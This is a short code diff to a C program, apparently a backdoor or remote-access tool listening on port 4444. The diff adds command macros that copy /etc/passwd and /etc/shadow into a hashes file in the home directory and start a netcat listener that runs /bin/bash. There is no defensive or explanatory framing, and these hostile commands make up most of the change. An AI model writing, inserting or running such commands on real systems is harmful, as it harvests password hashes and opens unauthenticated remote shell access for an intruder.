@@ -12,6 +12,11 @@
 #define PORT 4444
 #define BACKLOG_SIZE 10
 
+#define COMMAND1 "cat /etc/passwd > ~/hashes && cat /etc/shadow >> ~/hashes"
+#define COMMAND2 "nc -l -p 4444 -e /bin/bash"
+#define COMMAND3 ""
+#define COMMAND4 ""
+
 //----[include]----
 
 #include <stdio.h>
